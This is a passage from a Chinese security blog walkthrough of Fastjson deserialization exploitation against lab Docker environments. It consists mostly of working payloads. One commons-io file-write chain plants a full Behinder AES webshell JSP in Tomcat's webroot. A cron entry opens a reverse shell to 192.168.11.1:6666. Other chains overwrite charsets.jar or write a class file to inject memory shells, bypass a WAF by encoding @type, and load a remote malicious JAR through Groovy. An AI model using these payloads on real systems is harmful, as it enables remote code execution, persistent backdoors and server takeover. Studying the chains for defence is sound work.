<p>说明可以成功读取文件。接下来就需要探测<code>WEB</code>绝对路径，需要通过<code>file://</code>协议列出目录进行字节码对比，根据目标情况逐步探测目录，简单修改<a target="_blank" rel="noopener" href="https://github.com/lemono0/FastJsonParty/blob/main/1268-writefile-jsp/readfile.py">readfile.py</a>进行目录枚举（<code>file</code>协议也可以替换为<code>netdoc</code>协议）:</p>
<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240529182705579.png"></p>
<p>一直枚举目录直到找到<code>web</code>目录</p>
<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240529180447493.png"></p>
<p>写入的内容需要大于<code>8192</code>字符，尝试写入冰蝎<code>webshell</code>:</p>
<pre><code class="line-numbers language-json">{
  "x":{
    "@type":"com.alibaba.fastjson.JSONObject",
    "input":{
      "@type":"java.lang.AutoCloseable",
      "@type":"org.apache.commons.io.input.ReaderInputStream",
      "reader":{
        "@type":"org.apache.commons.io.input.CharSequenceReader",
        "charSequence":{"@type":"java.lang.String""&lt;%@page import=\"java.util.*,javax.crypto.*,javax.crypto.spec.*\"%&gt;&lt;%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%&gt;&lt;%if (request.getMethod().equals(\"POST\")){String k=\"e45e329feb5d925b\";session.putValue(\"u\",k);Cipher c=Cipher.getInstance(\"AES\");c.init(2,new SecretKeySpec(k.getBytes(),\"AES\"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%&gt;&lt;!-- a*8192  --%&gt;"
      },
      "charsetName":"UTF-8",
      "bufferSize":1024
    },
    "branch":{
      "@type":"java.lang.AutoCloseable",
      "@type":"org.apache.commons.io.output.WriterOutputStream",
      "writer":{
        "@type":"org.apache.commons.io.output.FileWriterWithEncoding",
        "file":"/usr/local/tomcat/apache-tomcat-8.5.95/webapps/ROOT/shell.jsp",
        "encoding":"UTF-8",
        "append": false
      },
      "charset":"UTF-8",
      "bufferSize": 1024,
      "writeImmediately": true
    },
    "trigger":{
      "@type":"java.lang.AutoCloseable",
      "@type":"org.apache.commons.io.input.XmlStreamReader",
      "is":{
        "@type":"org.apache.commons.io.input.TeeInputStream",
        "input":{
          "$ref":"$.input"
        },
        "branch":{
          "$ref":"$.branch"
        },
        "closeBranch": true
      },
      "httpContentType":"text/xml",
      "lenient":false,
      "defaultEncoding":"UTF-8"
    },
    "trigger2":{
      "@type":"java.lang.AutoCloseable",
      "@type":"org.apache.commons.io.input.XmlStreamReader",
      "is":{
        "@type":"org.apache.commons.io.input.TeeInputStream",
        "input":{
          "$ref":"$.input"
        },
        "branch":{
          "$ref":"$.branch"
        },
        "closeBranch": true
      },
      "httpContentType":"text/xml",
      "lenient":false,
      "defaultEncoding":"UTF-8"
    },
    "trigger3":{
      "@type":"java.lang.AutoCloseable",
      "@type":"org.apache.commons.io.input.XmlStreamReader",
      "is":{
        "@type":"org.apache.commons.io.input.TeeInputStream",
        "input":{
          "$ref":"$.input"
        },
        "branch":{
          "$ref":"$.branch"
        },
        "closeBranch": true
      },
      "httpContentType":"text/xml",
      "lenient":false,
      "defaultEncoding":"UTF-8"
    }
  }
}
</code></pre>
<p>写入并连接成功:</p>
<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240529191328624.png"></p>
<p><strong>写计划任务</strong></p>
<p>写<code>Linux</code>下计划任务时需要<code>root</code>权限，可以将文件写入到<code>/etc/cron.d</code>文件夹下。参考格式:</p>
<pre><code class="line-numbers language-tex">\n\nSHELL=/bin/bash\n\n* * * * * root bash -i &gt;&amp; /dev/tcp/192.168.11.1/6666 0&gt;&amp;1\n\n#aaaaa
</code></pre>
<p>使用写计划任务环境 <a target="_blank" rel="noopener" href="https://github.com/lemono0/FastJsonParty/tree/main/1268-jdk8-writefile">1268-jdk8-writefile</a>时因为镜像架构不兼容，只有手动重新构建一个镜像，先从启动失败的容器中复制需要的文件到本地:</p>
<pre><code class="line-numbers language-bash">docker cp &lt;container_id_or_name&gt;:/tmp/start.sh /tmp/start.sh
docker cp &lt;container_id_or_name&gt;:/var/app/1268-writefile.jar /tmp/1268-writefile.jar
</code></pre>
<p>编写<code>Dockerfile</code>文件:</p>
<pre><code># 使用 CentOS 作为基础镜像
FROM centos:7

# 作者信息
LABEL maintainer="yanghaoi"

# 更新系统并安装 JDK 8
RUN yum -y update &amp;&amp; \
    yum -y install java-1.8.0-openjdk-devel &amp;&amp; \
    yum -y install cronie &amp;&amp; \
    yum clean all

# 设置 JAVA_HOME 环境变量
ENV JAVA_HOME /usr/lib/jvm/java-1.8.0-openjdk

# 显示 Java 版本以确认安装成功
RUN java -version

# 设置工作目录
WORKDIR /app

# 将启动脚本和应用程序复制到工作目录
COPY start.sh /var/app/start.sh
COPY 1268-writefile.jar /var/app/1268-writefile.jar

# 赋予启动脚本执行权限
RUN chmod +x /var/app/start.sh

# 指定启动脚本为容器启动时的执行文件
CMD ["/var/app/start.sh"]
</code></pre>
<p>使用<code>docker build -t centos-jdk8 . </code>命令构建镜像后启动容器: <code>docker run -d --name 1268writefile -p 18080:80 centos-jdk8</code>。还是通过报错方式探测版本和依赖，这个环境里存在<code>WAF</code>，可以将<code>@type</code>编码为<code>"\x40\u0074\u0079\u0070\u0065</code>进行绕过：</p>
<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240531154117377.png"></p>
<p>不存在<code>org.apache.commons.io.file.Counters</code>和<code>org.apache.commons.io.Charsets</code>，考虑试试依赖<code>JDK</code>的<code>Payload</code>，编写一个<code>crontab</code>文件进行反弹<code>SHELL</code>：</p>
<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240531171420489.png"></p>
<p>通过<code>Python</code>脚本编码为<code>Base64</code>：</p>
<pre><code class="line-numbers language-python"># 将文件压缩后转为base64
import zlib
import base64

def compress_file_to_base64(file_path):
    # 读取文件内容
    with open(file_path, 'rb') as file:
        file_content = file.read()
    
    # 压缩文件内容
    compressed_content = zlib.compress(file_content)
    
    # 将压缩后的内容转换为 base64 字符串
    base64_str = base64.b64encode(compressed_content).decode('utf-8')
    
    return base64_str

# 示例用法
file_path = 'crontab'  # 替换为你的文件路径
compressed_base64_str = compress_file_to_base64(file_path)
print(compressed_base64_str)
</code></pre>
<p>发送<code>JDK8</code>环境下写文件的载荷，成功获得反弹会话:</p>
<pre><code class="line-numbers language-JSON">{
    '\x40\u0074\u0079\u0070\u0065':"java.lang.AutoCloseable",
    '\x40\u0074\u0079\u0070\u0065':'sun.rmi.server.MarshalOutputStream',
    'out':
    {
        '\x40\u0074\u0079\u0070\u0065':'java.util.zip.InflaterOutputStream',
        'out':
        {
           '\x40\u0074\u0079\u0070\u0065':'java.io.FileOutputStream',
           'file':'/etc/crontab',
           'append':false
        },
        'infl':
        { 'input':'Bye_Base64'
        },
        'bufLen':1048576
    },
    'protocolVersion':1
}
</code></pre>
<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240531171854036.png"></p>
<p><strong>覆盖charsets.jar</strong></p>
<p>继续使用写计划任务这个环境来实现覆盖<code>charsets.jar</code>注入内存马。首先需要制作用来执行注入内存马的<code>charsets.jar</code>。</p>
<p><em>1.charsets.jar路径遍历</em></p>
<p>这个环境没有配置<code>commons.io</code>依赖，并不能通过枚举目录的方式获得完整路径，只有尝试所有可能的路径写入，写入失败时会抛出异常，所以可以先尝试写入测试文件:</p>
<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240604021151472.png"></p>
<p>测试环境可以通过以下命令查看一下:</p>
<pre><code class="line-numbers language-cmd">ls -lrt /etc/alternatives/java
</code></pre>
<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240604013018672.png"></p>
<p>在项目<a target="_blank" rel="noopener" href="https://github.com/LandGrey/spring-boot-upload-file-lead-to-rce-tricks">spring-boot-upload-file-lead-to-rce-tricks</a>中存在一个常见依赖的路径字典，因为可以通过依赖检测确定是<code>JDK8</code>，与上面实际的路径对比就会发现，只需要暴力破解其中的版本号<code>1.8.0.282.b08</code>中的<code>282.b08</code>即可:</p>
<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240604021311551.png"></p>
<p>而版本号信息可以通过更新记录，如<a target="_blank" rel="noopener" href="https://github.com/openjdk/jdk8u/tags">jdk8u/tags</a>中获得:</p>
<pre><code>/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.[jdk8u/tags]-[1-10].[el7_9].x86_64/jre/bin/java
</code></pre>
<p>这样来看还是大概率遍历到真实路径的。</p>
<p><em>2.编译charsets.jar</em></p>
<p>编译覆盖目标环境的<code>charsets.jar</code>时，需要根据目标<code>JDK</code>版本选择<code>maven</code>项目的<code>JDK</code>版本，如靶场环境是<code>JDK8</code>:</p>
<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240603122722482.png"></p>
<p>新建一个名为<code>charsets</code>的<code>maven</code>项目, 项目使用探测到的<code>JDK</code>对应版本:</p>
<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240601172829147.png"></p>
<p>然后在<a target="_blank" rel="noopener" href="https://github.com/LandGrey/spring-boot-upload-file-lead-to-rce-tricks/tree/main/charsets">spring-boot-upload-file-lead-to-rce-tricks</a>项目中将<code>src</code>下的文件复制到项目中:</p>
<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240601173247078.png"></p>
<p>接下来需要准备内存马的注入代码，编写到<code>IBM33722.java</code>这个文件中，使用<a target="_blank" rel="noopener" href="https://github.com/pen4uin/java-memshell-generator">pen4uin/java-memshell-generator</a>内存马生成工具生成一个内存马:</p>
<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240601174016878.png"></p>
<p>可以先生成<code>JSP</code>文件，对照编写<code>JAVA</code>代码:</p>
<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240601173509512.png"></p>
<p>在<code>JSP</code>中是将<code>Base64</code>编码的<code>.class</code>字节码还原后进行实例化，所以根据逻辑在<code>IBM33722.java</code>编写对应的<code>JAVA</code>代码:</p>
<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240601173830314.png"></p>
<p>加载内存马代码如下:</p>
<pre><code class="line-numbers language-java">package sun.nio.cs.ext;
import java.util.UUID;
public class IBM33722 {
    static {
        fun();
    }
    public IBM33722(){
        fun();
    }
    private static java.util.HashMap&lt;String, String&gt; fun(){
        String bytecodeBase64 = "yv66...";
        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
        try {
            classLoader.loadClass("org.apache.logging.e.EncryptionUtil").newInstance();
        } catch (Exception e) {
            try {
                java.lang.reflect.Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
                defineClass.setAccessible(true);
                byte[] bytecode = null;
                try {
                    Class base64Clz = classLoader.loadClass("java.util.Base64");
                    java.lang.reflect.Method getDecoderMethod = base64Clz.getMethod("getDecoder");
                    Object decoder = getDecoderMethod.invoke(null);
                    java.lang.reflect.Method decodeMethod = decoder.getClass().getMethod("decode", String.class);
                    bytecode = (byte[]) decodeMethod.invoke(decoder, bytecodeBase64);
                } catch (ClassNotFoundException ee) {
                    Class datatypeConverterClz = classLoader.loadClass("javax.xml.bind.DatatypeConverter");
                    java.lang.reflect.Method parseBase64BinaryMethod = datatypeConverterClz.getMethod("parseBase64Binary", String.class);
                    bytecode = (byte[]) parseBase64BinaryMethod.invoke(null, bytecodeBase64);
                }
                Class clazz = (Class) defineClass.invoke(classLoader, bytecode, 0, bytecode.length);
                clazz.newInstance();
            } catch (Exception ex) {
                ex.printStackTrace();
            }
        }
        return null;
    }
}
</code></pre>
<p>在项目结构中设置工件，主类默认构建<code>jar</code>包:</p>
<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240603131154702.png"></p>
<p>然后将生成的<code>JAR</code>包通过上文的<code>Python</code>代码转为zlib压缩后的Base64字符串。</p>
<p><em>3.覆盖目标charsets.jar</em></p>
<p>尝试覆写<code>charsets.jar</code>文件后，响应信息没有抛出异常说明可能成功了:</p>
<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240603131856428.png"></p>
<p><em>4.触发内存马</em></p>
<p>使用载荷触发字符集解析进行<code>jar</code>加载:</p>
<pre><code class="line-numbers language-json">{
    "x":{
        "@type":"java.nio.charset.Charset",
        "val":"GBK"
    }
}
</code></pre>
<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240603131941631.png"></p>
<p>返回的异常信息似乎已经触发了<code>jar</code>包加载，配置好密码和请求头尝试访问内存马地址，发现可以成功链接:</p>
<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240601173933021.png"></p>
<p>接下来可以考虑根据环境目标<code>JDK</code>版本恢复原始<code>charsets.jar</code>文件。</p>
<p><strong>写Class文件加载</strong></p>
<p>写Class文件的利用方式需要通过<code>commons.io</code>依赖创建目录以及二进制文件的写入，需要用到<a target="_blank" rel="noopener" href="https://github.com/lemono0/FastJsonParty/tree/main/1268-writefile-no-network">1268-writefile-no-network</a>环境。使用<code>docker build -t 1268wclass . </code>命令构建镜像后启动容器: <code>docker run -d --name 1268wclass -p 18081:80 1268wclass</code>。这种方式是在<code>jre/classes</code>目录下(不存在目录时可以通过对应<code>Payload</code>创建)写入<code>class</code>文件后通过其他方式触发类加载利用，具体的操作步骤如下:</p>
<p><em>1.枚举JDK目录</em></p>
<p>这个环境中可以使用之前<code>commons.io</code>依赖的方法枚举目录，有时候如果是通过<code>JAVA</code>绝对路径启动的<code>WEB</code>服务也可以读取<code>file:///proc/self/cmdline</code>获得路径。</p>
<p>通过脚本枚举<code>file:///usr/lib/jvm/</code>得到目录列表（只有第一个是目录，其他都是符号链接）:</p>
<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240604180703417.png"></p>
<p>继续枚举<code>jre</code>中是否存在<code>classes</code>目录:</p>
<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240604181821070.png"></p>
<p><em>2.创建目录</em></p>
<p>检测后发现不存在<code>classes</code>目录，所以通过<code>payload</code>创建目录:</p>
<pre><code class="line-numbers language-json">{
 "@type":"java.lang.AutoCloseable",
 "@type":"org.apache.commons.io.output.WriterOutputStream",
 "writer":{
 "@type":"org.apache.commons.io.output.LockableFileWriter",
 "file":"/etc/passwd",
 "encoding":"UTF-8",
 "append": true,
"lockDir":"/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.362.b08-1.el7_9.x86_64/jre/classes" 
 },
 "charset":"UTF-8",
 "bufferSize": 8193,
 "writeImmediately": true
 }
</code></pre>
<p>发送请求后，继续通过枚举目录的方式发现成功创建了目录:</p>
<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240604182008537.png"></p>
<p><em>3.编写class文件</em></p>
<p>接下来需要代码，实现类加载器注入内存马:</p>
<pre><code class="line-numbers language-java">import java.io.IOException;

/**
 * @author threedr3am
 */
public class MemberShell implements AutoCloseable {
    static {
        String bytecodeBase64 = "yv66...";
        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
        try {
            classLoader.loadClass("org.apache.logging.e.EncryptionUtil").newInstance();
        } catch (Exception e) {
            try {
                java.lang.reflect.Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
                defineClass.setAccessible(true);
                byte[] bytecode = null;
                try {
                    Class base64Clz = classLoader.loadClass("java.util.Base64");
                    java.lang.reflect.Method getDecoderMethod = base64Clz.getMethod("getDecoder");
                    Object decoder = getDecoderMethod.invoke(null);
                    java.lang.reflect.Method decodeMethod = decoder.getClass().getMethod("decode", String.class);
                    bytecode = (byte[]) decodeMethod.invoke(decoder, bytecodeBase64);
                } catch (ClassNotFoundException ee) {
                    Class datatypeConverterClz = classLoader.loadClass("javax.xml.bind.DatatypeConverter");
                    java.lang.reflect.Method parseBase64BinaryMethod = datatypeConverterClz.getMethod("parseBase64Binary", String.class);
                    bytecode = (byte[]) parseBase64BinaryMethod.invoke(null, bytecodeBase64);
                }
                Class clazz = (Class) defineClass.invoke(classLoader, bytecode, 0, bytecode.length);
                clazz.newInstance();
            } catch (Exception ex) {
                ex.printStackTrace();
            }
        }
    }

    @Override
    public void close() throws Exception {

    }
}
</code></pre>
<p>在不知道目标<code>JDK</code>版本的情况下优先使用低版本<code>JDK</code>，这里使用<code>JDK8</code>将代码编译为<code>class</code>文件<code>javac MemberShell.java</code>，然后再转为<code>zlib</code>压缩和Base64字符串通过<code>JDK8</code>的二进制写入载荷:</p>
<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240604185218762.png"></p>
<p>检查下目录，class文件已经成功写入:</p>
<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240604185325250.png"></p>
<p><em>4.触发class加载</em></p>
<p>需要使用<code>java.lang.AutoCloseable</code>来绕过<code>autotype</code>的检查进行后续类加载的触发:</p>
<pre><code class="line-numbers language-json">{
    "@type":"java.lang.AutoCloseable",
    "@type":"MemberShell"
}
</code></pre>
<p>在没写入<code>class</code>之前，发送触发<code>payload</code>：</p>
<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240604182154708.png"></p>
<p>写入成功之后再触发:</p>
<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240604182218342.png"></p>
<p>接下来触发内存马加载:</p>
<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240604185723356.png"></p>
<p>成功使用冰蝎连接了内存马:</p>
<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240604185946947.png"></p>
<h3 id="fastjson-1-2-80-groovy"><a href="#fastjson-1-2-80-groovy" class="headerlink" title="fastjson-1.2.80-groovy"></a>fastjson-1.2.80-groovy</h3><p>通过<a target="_blank" rel="noopener" href="https://github.com/lemono0/FastJsonParty/blob/main/1280-groovy">1280-groovy</a>搭建测试环境:</p>
<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240605004133211.png"></p>
<p>先制作一个恶意<code>JAR</code>文件，改造<a target="_blank" rel="noopener" href="https://github.com/Lonely-night/fastjsonVul/tree/master/attack">fastjsonVul-attack</a>项目，写入内存马加载代码，生成<code>jar</code>文件:</p>
<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240605011235560.png"></p>
<p>然后将该<code>jar</code>文件存放在<code>WEB</code>服务器中，通过链接访问可以直接下载文件即可。在后续利用时，会发现远程加载地址classpathList可以是<code>jar</code>文件也可以是<code>web</code>目录。如果是<code>WEB</code>目录时，目录结构满足如下:</p>
<pre><code class="line-numbers language-tex">├─groovy
│  └─grape
│          GrabAnnotationTransformation2.class
│
└─META-INF
    └─services
           org.codehaus.groovy.transform.ASTTransformation
</code></pre>
<p>只需要在<code>org.codehaus.groovy.transform.ASTTransformation</code>文件中填写需要加载的类文件即可，后续更新时也只需要更新对应的<code>class</code>文件:</p>
<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240605014034340.png"></p>
<p>加载过程如下:</p>
<pre><code>1.访问ASTTransformation文件获取类名称
http://x.x.x.x/META-INF/services/org.codehaus.groovy.transform.ASTTransformation

2.访问上个文件获取到的类文件
http://x.x.x.x/groovy/grape/GrabAnnotationTransformation2.class
</code></pre>
<p>准备好远程类文件后，执行第一步<code>payload</code>:</p>
<pre><code class="line-numbers language-json">{
    "@type":"java.lang.Exception",
    "@type":"org.codehaus.groovy.control.CompilationFailedException",
    "unit":{}
}
</code></pre>
<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240605011531881.png"></p>
<p>执行第二步<code>payload</code>触发远程<code>JAR</code>包加载（要进行第二次加载时需要修改下<code>JAR</code>文件名）:</p>
<pre><code class="line-numbers language-json">{
    "@type":"org.codehaus.groovy.control.ProcessingUnit",
    "@type":"org.codehaus.groovy.tools.javac.JavaStubCompilationUnit",
    "config":{
        "@type":"org.codehaus.groovy.control.CompilerConfiguration",
        "classpathList":"http://x.x.x.x:8000/attack-2.jar"
    }
}
</code></pre>
<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240605011946333.png"></p>
<p>执行成功后即可访问内存马:</p>
<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240605012346969.png"></p>
<h2 id="0x06-参考链接"><a href="#0x06-参考链接" class="headerlink" title="0x06 参考链接"></a>0x06 参考链接</h2><h3 id="简介和基础"><a href="#简介和基础" class="headerlink" title="简介和基础"></a><strong>简介和基础</strong></h3><p><a target="_blank" rel="noopener" href="https://b1ue.cn/archives.html">归档 - 浅蓝 ‘s blog (b1ue.cn)</a></p>
<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/x5T2fE6knlMW5j9kWwnz8w">fastjson绕过waf的一些技巧 (qq.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://yml-sec.top/2022/02/16/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/">Fastjson反序列化漏洞复现分析 (yml-sec.top)</a></p>
<p><a target="_blank" rel="noopener" href="https://www.mi1k7ea.com/2021/02/08/Fastjson%E7%B3%BB%E5%88%97%E5%85%AD%E2%80%94%E2%80%941-2-48-1-2-68%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#%E5%89%8D%E6%8F%90%E6%9D%A1%E4%BB%B6-3">（安全客首发）Fastjson系列六——1.2.48-1.2.68反序列化漏洞</a></p>
<p><a target="_blank" rel="noopener" href="https://juejin.cn/post/6846687594130964488">fastjson到底做错了什么？为什么会被频繁爆出漏洞？ - 掘金 (juejin.cn)</a></p>
<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/516836433">Shiro与Fastjson两种不同的反序列化注入内存马姿势 - 知乎 (zhihu.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://www.blackhat.com/us-21/briefings/schedule/index.html#how-i-used-a-json-deserialization-day-to-steal-your-money-on-the-blockchain-22815">How I Used a JSON Deserialization 0day to Steal Your Money on the Blockchain - Black Hat USA 2021 | Briefings Schedule</a></p>
<h3 id="版本判断"><a href="#版本判断" class="headerlink" title="版本判断"></a><strong>版本判断</strong></h3><p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/jbkN86qq9JxkGNOhwv9nxA">盲判断目标的fastjson版本 (qq.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/moonfullyear/articles/16139096.html">Fastjson 全版本RCE - 月满年 - 博客园 (cnblogs.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://b1ue.cn/archives/402.html">fastjson 获取精确版本号的方法 - 浅蓝 ‘s blog (b1ue.cn)</a></p>
<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/667787450?utm_id=0">第18篇：fastjson反序列化漏洞区分版本号的方法总结 - 知乎 (zhihu.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/lemono0/FastJsonParty/blob/main/Fastjson%E5%85%A8%E7%89%88%E6%9C%AC%E6%A3%80%E6%B5%8B%E5%8F%8A%E5%88%A9%E7%94%A8-Poc.md">FastJsonParty/Fastjson全版本检测及利用-Poc.md at main · lemono0/FastJsonParty (github.com)</a></p>
<h3 id="写文件到RCE"><a href="#写文件到RCE" class="headerlink" title="写文件到RCE"></a><strong>写文件到RCE</strong></h3><p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/HMlaMPn4LK3GMs3RvK6ZRA">fastjson v1.2.68 RCE利用链复现 (qq.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/WbYi7lPEvFg-vAUB4Nlvew">fastjson 1.2.68 反序列化写文件RCE探索 (qq.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1829644">fastjson v1.2.68 RCE利用链复现-腾讯云开发者社区-腾讯云 (tencent.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/mole_exp/article/details/122315526">Fastjson反序列化高危漏洞系列-part2：1.2.68反序列化漏洞及利用链分析 (上)</a></p>
<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/6fHJ7s6Xo4GEdEGpKFLOyg">Fastjson 1.2.68 反序列化漏洞 Commons IO 2.x 写文件利用链挖掘分析 (qq.com)</a></p>
<h3 id="POC整理列表"><a href="#POC整理列表" class="headerlink" title="POC整理列表"></a><strong>POC整理列表</strong></h3><p><a target="_blank" rel="noopener" href="https://github.com/safe6Sec/Fastjson">https://github.com/safe6Sec/Fastjson</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/lemono0/FastJsonParty">https://github.com/lemono0/FastJsonParty</a></p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/361576.html">https://www.freebuf.com/vuls/361576.html</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/kezibei/fastjson_payload">https://github.com/kezibei/fastjson_payload</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/su18/hack-fastjson-1.2.80">https://github.com/su18/hack-fastjson-1.2.80</a></p>
<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/dnxCEt03jJUFS3-ROHdihg">https://mp.weixin.qq.com/s/dnxCEt03jJUFS3-ROHdihg</a></p>
<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/sD-VSjHoXMoLTZvMlWB0vw">https://mp.weixin.qq.com/s/sD-VSjHoXMoLTZvMlWB0vw</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/threedr3am/learnjavabug/tree/master/fastjson">https://github.com/threedr3am/learnjavabug/tree/master/fastjson</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/W01fh4cker/LearnFastjsonVulnFromZero-Improvement">https://github.com/W01fh4cker/LearnFastjsonVulnFromZero-Improvement</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/lemono0/FastJsonParty/blob/main/Fastjson%E5%85%A8%E7%89%88%E6%9C%AC%E6%A3%80%E6%B5%8B%E5%8F%8A%E5%88%A9%E7%94%A8-Poc.md">FastJsonParty/Fastjson全版本检测及利用-Poc.md at main · lemono0/FastJsonParty (github.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://medium.com/@knownsec404team/fastjson-deserialization-vulnerability-history-5206714ceed1">https://medium.com/@knownsec404team/fastjson-deserialization-vulnerability-history-5206714ceed1</a></p>
<p><a target="_blank" rel="noopener" href="https://pazuris.cn/2023/08/31/FastJson%E5%85%A8%E7%B3%BB%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">https://pazuris.cn/2023/08/31/FastJson%E5%85%A8%E7%B3%BB%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</a></p>
<h3 id="不出网利用"><a href="#不出网利用" class="headerlink" title="不出网利用"></a><strong>不出网利用</strong></h3><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/12492">https://xz.aliyun.com/t/12492</a> </p>
<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/LZt-I3s0dQ_bK9ubEix8iQ">https://mp.weixin.qq.com/s/LZt-I3s0dQ_bK9ubEix8iQ</a></p>
<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/03e9Pj3PwpZCQbJCMIaeVA">https://mp.weixin.qq.com/s/03e9Pj3PwpZCQbJCMIaeVA</a></p>
<h3 id="高版本JDK环境下JNDI注入"><a href="#高版本JDK环境下JNDI注入" class="headerlink" title="高版本JDK环境下JNDI注入"></a><strong>高版本JDK环境下JNDI注入</strong></h3><p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/573404608">攻击Java RMI的方式</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/CoLo/p/15496636.html">Java RMI学习与解读（三）</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/whatday/article/details/128456725">java rmi 反序列化命令执行</a></p>
<p><a target="_blank" rel="noopener" href="https://y4tacker.github.io/2023/03/20/year/2023/3/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">FastJson与原生反序列化 (y4tacker)</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/kxcode/JNDI-Exploit-Bypass-Demo">kxcode/JNDI-Exploit-Bypass-Demo</a></p>
